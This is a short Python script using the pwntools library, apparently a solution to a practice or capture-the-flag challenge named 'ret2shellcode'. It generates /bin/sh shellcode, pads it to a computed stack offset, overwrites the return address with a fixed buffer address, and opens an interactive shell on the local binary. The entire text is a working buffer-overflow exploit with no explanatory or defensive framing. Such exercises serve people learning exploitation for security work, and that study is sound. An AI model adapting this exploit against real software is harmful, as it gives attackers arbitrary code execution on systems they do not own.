from pwn import *

target_addr = 0x0804A080
offset = 0xFFDA3C88-0xFFDA3C1C+4
shellcode = asm(shellcraft.sh())
print("shellcode length:{}".format(len(shellcode)))
padding = (offset-len(shellcode))*b'A'
sh = process("./ret2shellcode")
sh.sendline(shellcode+padding+p32(target_addr))
sh.interactive()
